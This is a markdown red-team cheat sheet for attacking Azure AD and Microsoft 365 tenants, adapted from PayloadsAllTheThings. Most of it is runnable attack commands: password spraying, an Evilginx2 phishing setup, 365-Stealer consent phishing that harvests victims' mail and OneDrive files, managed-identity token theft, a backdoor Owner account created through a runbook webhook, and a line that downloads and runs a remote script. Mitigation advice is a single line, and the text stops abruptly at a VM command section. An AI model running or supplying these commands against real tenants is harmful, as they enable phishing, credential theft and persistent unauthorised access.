# Azure Red Team Master and Cheat Sheets

[← Home](../../README.md) · [Topic index](../INDEX.md)

## Contents

- [PreReq Requirements and free training](#prereq-requirements-and-free-training)
- [Current Bug Bounties](#current-bug-bounties)
- [Commando VM](#commando-vm)
- [Summary](#summary)
- [Azure Recon Tools](#azure-recon-tools)
- [Enumeration](#enumeration)
- [Enumerate valid emails](#enumerate-valid-emails)
- [Enumerate Azure Subdomains](#enumerate-azure-subdomains)
- [Enumerate tenant with Azure AD Powershell](#enumerate-tenant-with-azure-ad-powershell)
- [Enumerate tenant with Az Powershell](#enumerate-tenant-with-az-powershell)
- [Enumerate tenant with az cli](#enumerate-tenant-with-az-cli)
- [Enumerate manually](#enumerate-manually)
- [Enumeration methodology](#enumeration-methodology)
- [Phishing with Evilginx2](#phishing-with-evilginx2)
- [Illicit Consent Grant](#illicit-consent-grant)
- [Register Application](#register-application)
- [Configure Application](#configure-application)
- [Setup 365-Stealer](#setup-365-stealer)
- [Token from Managed Identity](#token-from-managed-identity)
- [Azure API via Powershell](#azure-api-via-powershell)
- [Azure API via Python Version](#azure-api-via-python-version)
- [Get Tokens](#get-tokens)
- [Use Tokens](#use-tokens)
- [Refresh Tokens](#refresh-tokens)

# Azure Active Directory

Original Source:[Swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md)

## PreReq Requirements and free training

[Webcast: OPSEC Fundamentals for Remote Red Teams](https://www.blackhillsinfosec.com/webcast-opsec-fundamentals-for-remote-red-teams/)

[EDITED EDITION — Getting Started in Pentesting The Cloud–Azure | Beau Bullock | 1-Hour](https://www.youtube.com/watch?v=u_3cV0pzptY)

[Workshop:Breaching The Cloud Perimeter w/ Beau Bullock](https://www.blackhillsinfosec.com/breaching-the-cloud-perimeter-w-beau-bullock/)

[Microsoft Penetration Testing](https://docs.microsoft.com/en-us/azure/security/fundamentals/pen-testing)

[Penetration Testing Rules of Engagement](https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement?rtc=3)

## Current Bug Bounties

[Azure SSRF Research Challenge](https://www.microsoft.com/en-us/msrc/azure-ssrf-research-challenge)

## Commando VM

Repo Location: [Commando VM](https://github.com/fireeye/commando-vm)

Post Commando Tools to install: [Connect to all Microsoft 365 services in a single PowerShell window](https://docs.microsoft.com/en-us/microsoft-365/enterprise/connect-to-all-microsoft-365-services-in-a-single-windows-powershell-window?view=o365-worldwide)

## Summary

* [Azure Recon Tools](#azure-recon-tools)
* [Enumeration](#enumeration)
    * [Enumerate valid emails](#enumerate-valid-emails)
    * [Enumerate Azure Subdomains](#enumerate-azure-subdomains)
    * [Enumerate tenant with Azure AD Powershell](#enumerate-tenant-with-azure-ad-powershell)
    * [Enumerate tenant with Az Powershell](#enumerate-tenant-with-az-powershell)
    * [Enumerate tenant with az cli](#enumerate-tenant-with-az-cli)
    * [Enumerate manually](#enumerate-manually)
    * [Enumeration methodology](#enumeration-methodology)
* [Phishing with Evilginx2](#phishing-with-evilginx2)
* [Illicit Consent Grant](#illicit-consent-grant)
* [Token from Managed Identity](#token-from-managed-identity)
    * [Azure API via Powershell](#azure-api-via-powershell)
    * [Azure API via Python Version](#azure-api-via-python-version)
    * [Get Tokens](#get-tokens)
    * [Use Tokens](#use-tokens)
    * [Refresh Tokens](#refresh-tokens)
* [Stealing Tokens](#stealing-tokens)
    * [Stealing tokens from az cli](#stealing-tokens-from-az-cli)
    * [Stealing tokens from az powershell](#stealing-tokens-from-az-powershell)
* [Add Credentials to All Enterprise Applications](#add-credentials-to-all-enterprise-applications)
* [Spawn SSH for Azure Web App](#spawn-ssh-for-azure-web-app)
* [Azure Storage Blob](#azure-storage-blob)
    * [Enumerate blobs](#enumerate-blobs)
    * [SAS URL](#sas-url)
    * [List and download blobs](#list-and-download-blobs)
* [Runbook Automation](#runbook-automation)
    * [Create a Runbook](#create-a-runbook)
    * [Persistence via Automation accounts](#persistence-via-automation-accounts)
* [Virtual Machine RunCommand](#virtual-machine-runcommand)
* [KeyVault Secrets](#keyvault-secrets)
* [Pass The Certificate](#pass-the-certificate)
* [Pass The PRT](#pass-the-prt)
* [Intunes Administration](#intunes-administration)
* [Dynamic Group Membership](#dynamic-group-membership)
* [Administrative Unit](#administrative-unit)
* [Deployment Template](#deployment-template)
* [Application Proxy](#application-proxy)
* [Conditional Access](#conditional-access)
* [Azure AD](#azure-ad)
    * [Azure AD vs Active Directory](#azure-ad-vs-active-directory)
    * [Password Spray](#password-spray)
    * [Convert GUID to SID](#convert-guid-to-sid)
* [Azure AD Connect ](#azure-ad-connect)
    * [Azure AD Connect - Password extraction](#azure-ad-connect---password-extraction)
    * [Azure AD Connect - MSOL Account's password and DCSync](#azure-ad-connect---msol-accounts-password-and-dcsync)
    * [Azure AD Connect - Seamless Single Sign On Silver Ticket](#azure-ad-connect---seamless-single-sign-on-silver-ticket)
* [References](#references)

## Azure Recon Tools

* **ROADTool** 
    ```powershell
    pipenv shell
    roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]
    roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa]
    roadrecon auth -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
    roadrecon gather
    roadrecon gui
    ```
* **StormSpotter**
    ```powershell
    # https://github.com/Azure/Stormspotter

    # session 1 - backend
    pipenv shell
    python ssbackend.pyz

    # session 2 - frontend
    cd C:\Tools\stormspotter\frontend\dist\spa\
    quasar.cmd serve -p 9091 --history

    # session 3 - collector
    pipenv shell
    az login -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
    python C:\Tools\stormspotter\stormcollector\sscollector.pyz cli

    # Web access on http://localhost:9091
    Username: neo4j
    Password: BloodHound
    Server: bolt://localhost:7687
    ```
* **Azure Hound**
    ```powershell
    # https://github.com/BloodHoundAD/AzureHound

    . C:\Tools\AzureHound\AzureHound.ps1
    Invoke-AzureHound -Verbose

    # GUI access
    bolt://localhost:7687
    Username: neo4j
    Password: BloodHound

    # Cypher query example:
    MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p

    # Change object ID's to names in Bloodhound
    MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname

    # Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/
    ```
* List of Microsoft portals: https://msportals.io/
* **Azucar** : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.
    ```powershell
    # You should use an account with at least read-permission on the assets you want to access
    git clone https://github.com/nccgroup/azucar.git
    PS> Get-ChildItem -Recurse c:\Azucar_V10 | Unblock-File

    PS> .\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT
    PS> .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000
    PS> .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000

    # resolve the TenantID for an specific username
    PS> .\Azucar.ps1 -ResolveTenantUserName user@company.com
    ```
* **Azurite Explorer** and **Azurite Visualizer** : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.
    ```powershell
    git clone https://github.com/mwrlabs/Azurite.git
    git clone https://github.com/FSecureLABS/Azurite
    git submodule init
    git submodule update
    PS> Import-Module AzureRM
    PS> Import-Module AzuriteExplorer.ps1
    PS> Review-AzureRmSubscription
    PS> Review-CustomAzureRmSubscription
    ```
* **MicroBurst** - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping
    ```powershell
    $ git clone https://github.com/NetSPI/MicroBurst
    PS C:> Import-Module .\MicroBurst.psm1
    PS C:> Import-Module .\Get-AzureDomainInfo.ps1
    PS C:> Get-AzureDomainInfo -folder MicroBurst -Verbose
    ```
* **SkyArk** - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.   
    Require:
    - Read-Only permissions over Azure Directory (Tenant)
    - Read-Only permissions over Subscription
    - Require AZ and AzureAD module or administrator right

    ```powershell
    $ git clone https://github.com/cyberark/SkyArk
    $ powershell -ExecutionPolicy Bypass -NoProfile
    PS C> Import-Module .\SkyArk.ps1 -force
    PS C> Start-AzureStealth

    or in the Cloud Console

    PS C> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1')  
    PS C> Scan-AzureAdmins  
* **PowerZure** - 
    ```powershell
    require az module !
    $ git clone https://github.com/hausec/PowerZure
    $ ipmo .\PowerZure
    $ Set-Subscription -Id [idgoeshere]

    # Reader
    $ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails

    # Contributor
    $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command "whoami"
    $ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File "build.xml"
    $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents
    $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk

    # Owner
    $ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest
    
    # Administrator
    $ Create-Backdoor, Execute-Backdoor
    ```
    
## Enumeration

### Enumerate valid emails

> By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.

* Validate email 
    ```powershell
    PS> C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt
    admin@<TENANT NAME>.onmicrosoft.com   - VALID
    root@<TENANT NAME>.onmicrosoft.com    - INVALID
    test@<TENANT NAME>.onmicrosoft.com    - VALID
    contact@<TENANT NAME>.onmicrosoft.com - INVALID
    ```
* Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon

#### Password spraying

```powershell
PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
```

### Enumerate Azure Subdomains

```powershell
PS> . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose
Subdomain Service
--------- -------
<TENANT NAME>.mail.protection.outlook.com Email
<TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain
```

### Enumerate tenant with Azure AD Powershell

```powershell
Import-Module C:\Tools\AzureAD\AzureAD.psd1
Import-Module C:\Tools\AzureADPreview\AzureADPreview.psd1
PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS> $creds = New-Object System.Management.Automation.PSCredential("test@<TENANT NAME>.onmicrosoft.com", $passwd)
PS Az> Connect-AzureAD -Credential $creds

PS AzureAD> Get-AzureADUser -All $true
PS AzureAD> Get-AzureADUser -All $true | select UserPrincipalName
PS AzureAD> Get-AzureADGroup -All $true
PS AzureAD> Get-AzureADDevice
PS AzureAD> Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
PS AzureADPreview> Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

### Enumerate tenant with Az Powershell

```powershell
PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS> $creds = New-Object System.Management.Automation.PSCredential ("test@<TENANT NAME>.onmicrosoft.com", $passwd)
PS Az> Connect-AzAccount -Credential $creds

PS Az> Get-AzResource
PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com
PS Az> Get-AzVM | fl
PS Az> Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
PS Az> Get-AzFunctionApp
PS Az> Get-AzStorageAccount | fl
PS Az> Get-AzKeyVault
```

### Enumerate tenant with az cli

```powershell
PS> az login -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
PS> az vm list
PS> az vm list --query "[].[name]" -o table
PS> az webapp list
PS> az functionapp list --query "[].[name]" -o table
PS> az storage account list
PS> az keyvault list
```

### Enumerate manually

* Federation with Azure AD or O365
    ```powershell
- [login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1](https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1)
    https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1
    ```
* Get the Tenant ID
    ```powershell
- [login.microsoftonline.com/<DOMAIN>/.well-known](https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration)
- [login.microsoftonline.com](https://login.microsoftonline.com/<TENANT) - NAME>.onmicrosoft.com/.well-known/openid-configuration
    ```

## Enumeration methodology

```powershell
# Check Azure Joined 
PS> dsregcmd.exe /status
+----------------------------------------------------------------------+
| Device State |
+----------------------------------------------------------------------+
 AzureAdJoined : YES
 EnterpriseJoined : NO
 DomainJoined : NO
 Device Name : jumpvm

# Enumerate resources
PS Az> Get-AzResource

# Enumerate role assignments
PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/<VM-NAME>`

# Get info on a role
PS Az> Get-AzRoleDefinition -Name "Virtual Machine Command Executor"

# Get info user
PS AzureAD> Get-AzureADUser -ObjectId <ID>
PS AzureAD> Get-AzureADUser -ObjectId test@<TENANT NAME>.onmicrosoft.com | fl * 

# List all groups
PS AzureAD> Get-AzureADGroup -All $true

# Get members of a group
PS Az> Get-AzADGroup -DisplayName '<GROUP-NAME>'
PS Az> Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName

# Get Azure AD information
PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
PS AADInternals> Get-AADIntLoginInformation -UserName admin@<TENANT NAME>.onmicrosoft.com
PS AADInternals> Get-AADIntTenantID -Domain <TENANT NAME>.onmicrosoft.com # Get Tenant ID
PS AADInternals> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> # Get all the information

# Check if there is a user logged-in to az cli
PS> az ad signed-in-user show

# Check AppID Alternative Names/Display Name 
PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "<APP-ID>"} | fl


# Get all application objects registered using the current tenant
PS AzureAD> Get-AzureADApplication -All $true

# Get all details about an application
PS AzureAD> Get-AzureADApplication -ObjectId <ID> | fl *

# List all VM's the user has access to
PS Az> Get-AzVM 
PS Az> Get-AzVM | fl

# Get all function apps
PS Az> Get-AzFunctionApp

# Get all webapps
PS Az> Get-AzWebApp
PS Az> Get-AzWebApp | select-object Name, Type, Hostnames

# List all storage accounts
PS Az> Get-AzStorageAccount
PS Az> Get-AzStorageAccount | fl

# List all keyvaults
PS Az> Get-AzKeyVault
```

## Phishing with Evilginx2

```powershell
PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets
: config domain username.corp
: config ip 10.10.10.10
: phishlets hostname o365 login.username.corp
: phishlets get-hosts o365

Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine

# copy certificate and enable the phishing
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key
: phishlets enable o365

# get the phishing URL
: lures create o365
: lures get-url 0
```

## Illicit Consent Grant

> The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. 

Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole`
* **Disable user consent** : Users cannot grant permissions to applications.
* **Users can consent to apps from verified publishers or your organization, but only for permissions you select** : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant
* **Users can consent to all apps** : allows all users to consent to any permission which doesn't require admin consent,
* **Custom app consent policy**

### Register Application

1. Login to https://portal.azure.com > Azure Active Directory
2. Click on **App registrations** > **New registration**
3. Enter the Name for our application
4. Under support account types select **"Accounts in any organizational directory (Any Azure AD directory - Multitenant)"**
5. Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is `https://<DOMAIN/IP>:<PORT>/login/authorized`.
6. Click **Register** and save the **Application ID**

### Configure Application

1. Click on `Certificates & secrets`
2. Click on `New client secret` then enter the **Description** and click on **Add**.
3. Save the **secret**'s value.
4. Click on API permissions > Add a permission
5. Click on Microsoft Graph > **Delegated permissions**
6. Search and select the below mentioned permissions and click on Add permission
    * Contacts.Read 
    * Mail.Read / Mail.ReadWrite
    * Mail.Send
    * Notes.Read.All
    * Mailboxsettings.ReadWrite
    * Files.ReadWrite.All 
    * User.ReadBasic.All
    * User.Read

### Setup 365-Stealer

:warning: Default port for 365-Stealer phishing is 443

- Run XAMPP and start Apache
- Clone 365-Stealer into `C:\xampp\htdocs\`
    * `git clone https://github.com/AlteredSecurity/365-Stealer.git`
- Install the requirements
    * Python3
    * PHP CLI or Xampp server
    * `pip install -r requirements.txt`
- Enable sqlite3 (Xampp > Apache config > php.ini) and restart Apache
- Edit `C:/xampp/htdocs/yourvictims/index.php` if needed
    - Disable IP whitelisting `$enableIpWhiteList = false;`
- Go to 365-Stealer Management portal > Configuration (http://localhost:82/365-stealer/yourVictims)
    - **Client Id** (Mandatory): This will be the Application(Client) Id of the application that we registered.
    - **Client Secret** (Mandatory): Secret value from the Certificates & secrets tab that we created.
    - **Redirect URL** (Mandatory): Specify the redirect URL that we entered during registering the App like `https://<Domain/IP>/login/authorized` 
    - **Macros Location**: Path of macro file that we want to inject.
    - **Extension in OneDrive**: We can provide file extensions that we want to download from the victims account or provide `*` to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. 
    - **Delay**: Delay the request by specifying time in seconds while stealing
- Create a Self Signed Certificate to use HTTPS
- Run the application either click on the button or run this command : `python 365-Stealer.py --run-app`
    - `--no-ssl`: disable HTTPS
    - `--port`: change the default listening port
    - `--token`: provide a specific token
    - `--refresh-token XXX --client-id YYY --client-secret ZZZ`: use a refresh token
- Find the Phishing URL: go to `https://<IP/Domain>:<Port>` and click on **Read More** button or in the console.

**Mitigation**: Enable `Do not allow user consent` for applications in the "Consent and permissions menu".


## Token from Managed Identity

> **MSI_ENDPOINT** is an alias for **IDENTITY_ENDPOINT**, and **MSI_SECRET** is an alias for **IDENTITY_HEADER**.

Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : `env`

Most of the time, you want a token for one of these resources: 
* https://storage.azure.com
* https://vault.azure.net
* https://graph.microsoft.com
* https://management.azure.com


### Azure API via Powershell

Get **access_token** from **IDENTITY_HEADER** and **IDENTITY_ENDPOINT**: `system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');`. 

Then query the Azure REST API to get the **subscription ID** and more .

```powershell
$Token = 'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
# $URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value 

# List resources and check for runCommand privileges
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/<RG-NAME>/providers/Microsoft.Compute/virtualMachines/<RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01'
```

### Azure API via Python Version

```py
IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

print("[+] Management API")
cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])

print("\r\n[+] Graph API")
cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print(json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])
```

or inside a Python Function:

```py
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```


### Get Tokens

:warning: The lifetime of a Primary Refresh Token is 14 days!

```powershell
# az cli - get tokens 
az account get-access-token 
az account get-access-token --resource-type aad-graph
# or Az
(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
# or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT
```

### Use Tokens

> Tokens contain all the claims including that for MFA and Conditional Access

* Az Powershell
    ```powershell
    PS C:\Tools> $token = 'eyJ0e..'
    PS C:\Tools> Connect-AzAccount -AccessToken $token -AccountId <ACCOUNT-ID>

    # Access Token and Graph Token
    PS C:\Tools> $token = 'eyJ0eX..'
    PS C:\Tools> $graphaccesstoken = 'eyJ0eX..'
    PS C:\Tools> Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
    PS C:\Tools> Get-AzResource
    # ERROR: 'this.Client.SubscriptionId' cannot be null.
    # ---> The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI
    ```
* AzureAD
    ```powershell
    Import-Module C:\Tools\AzureAD\AzureAD.psd1
    $AADToken = 'eyJ0…'
    Connect-AzureAD -AadAccessToken $AADToken -TenantId <TENANT-ID> -AccountId <ACCOUNT-ID>
    ```

### Refresh Tokens

* https://github.com/ConstantinT/Lantern
    ```powershell
    Lantern.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>
    Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path>
    Lantern.exe token --username <Username> --password <Password>
    Lantern.exe token --refreshtoken <RefreshToken>
    Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) 
    ```
* https://github.com/rvrsh3ll/TokenTactics
    ```powershell
    Import-Module .\TokenTactics.psd1
    CommandType     Name                                               Version    Source
    -----------     ----                                               -------    ------
    Function        Clear-Token                                        0.0.1      TokenTactics
    Function        Dump-OWAMailboxViaMSGraphApi                       0.0.1      TokenTactics
    Function        Forge-UserAgent                                    0.0.1      TokenTactics
    Function        Get-AzureToken                                     0.0.1      TokenTactics
    Function        Get-TenantID                                       0.0.1      TokenTactics
    Function        Open-OWAMailboxInBrowser                           0.0.1      TokenTactics
    Function        Parse-JWTtoken                                     0.0.1      TokenTactics
    Function        RefreshTo-AzureCoreManagementToken                 0.0.1      TokenTactics
    Function        RefreshTo-AzureManagementToken                     0.0.1      TokenTactics
    Function        RefreshTo-DODMSGraphToken                          0.0.1      TokenTactics
    Function        RefreshTo-GraphToken                               0.0.1      TokenTactics
    Function        RefreshTo-MAMToken                                 0.0.1      TokenTactics
    Function        RefreshTo-MSGraphToken                             0.0.1      TokenTactics
    Function        RefreshTo-MSManageToken                            0.0.1      TokenTactics
    Function        RefreshTo-MSTeamsToken                             0.0.1      TokenTactics
    Function        RefreshTo-O365SuiteUXToken                         0.0.1      TokenTactics
    Function        RefreshTo-OfficeAppsToken                          0.0.1      TokenTactics
    Function        RefreshTo-OfficeManagementToken                    0.0.1      TokenTactics
    Function        RefreshTo-OutlookToken                             0.0.1      TokenTactics
    Function        RefreshTo-SubstrateToken                           0.0.1      TokenTactics
    ```

## Stealing Tokens

* Get-AzurePasswords
    ```powershell
    Import-Module Microburst.psm1
    Get-AzurePasswords
    Get-AzurePasswords -Verbose | Out-GridView
    ```

### Stealing tokens from az cli

* az cli stores access tokens in clear text in **accessTokens.json** in the directory `C:\Users\<username>\.Azure`
* azureProfile.json in the same directory contains information about subscriptions.

### Stealing tokens from az powershell

* Az PowerShell stores access tokens in clear text in **TokenCache.dat** in the directory `C:\Users\<username>\.Azure`
* It also stores **ServicePrincipalSecret** in clear-text in **AzureRmContext.json** 
* Users can save tokens using `Save-AzContext`


## Add credentials to all Enterprise Applications

```powershell
# Add secrets
PS > . C:\Tools\Add-AzADAppSecret.ps1
PS > Add-AzADAppSecret -GraphToken $graphtoken -Verbose

# Use secrets to authenticate as Service Principal
PS > $password = ConvertTo-SecureString '<SECRET/PASSWORD>' -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential('<AppID>', $password)
PS > Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '<TenantID>'
```

## Spawn SSH for Azure Web App

```powershell
az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-group <RG-NAME> -n <APP-SERVICE-NAME>
```

## Azure Storage Blob

* Blobs - `*.blob.core.windows.net`
* File Services - `*.file.core.windows.net`
* Data Tables - `*.table.core.windows.net`
* Queues - `*.queue.core.windows.net`

### Enumerate blobs

```powershell
PS > . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureBlobs.ps1
PS > Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile azureblobs.txt
Found Storage Account -  testsecure.blob.core.windows.net
Found Storage Account -  securetest.blob.core.windows.net
Found Storage Account -  securedata.blob.core.windows.net
Found Storage Account -  securefiles.blob.core.windows.net
```

### SAS URL

* Use [Storage Explorer](https://azure.microsoft.com/en-us/features/storage-explorer/)
* Click on **Open Connect Dialog** in the left menu. 
* Select **Blob container**. 
* On the **Select Authentication Method** page
    * Select **Shared access signature (SAS)** and click on Next
    * Copy the URL in **Blob container SAS URL** field.

:warning: You can also use `subscription`(username/password) to access storage resources such as blobs and files.

### List and download blobs

```powershell
PS Az> Get-AzResource
PS Az> Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>
PS Az> Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context
PS Az> Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob
```

## Runbook Automation

### Create a Runbook

```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group
az ad signed-in-user list-owned-objects

# If the user is not part of an "Automation" group.
# Add him to a custom group , e.g: "Automation Admins"
Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose

# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>

# Create a Powershell Runbook
PS C:\Tools> Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```

### Persistence via Automation accounts

* Create a new Automation Account
    * "Create Azure Run As account": Yes
* Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
    * Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst
    * Publish the runbook
    * Add a webhook to the runbook
* Add the AzureAD module to the Automation account
    * Update the Azure Automation Modules
* Assign "User Administrator" and "Subscription Owner" rights to the automation account
* Eventually lose your access…
* Trigger the webhook with a post request to create the new user
    ```powershell
    $uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
    $AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
    $body = ConvertTo-Json -InputObject $AccountInfo
    $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
    ```


## Virtual Machine RunCommand

Requirements: 
* `Microsoft.Compute/virtualMachines/runCommand/action`

```powershell
# Get Public IP of VM : query the network interface
PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>

# Execute Powershell script on the VM
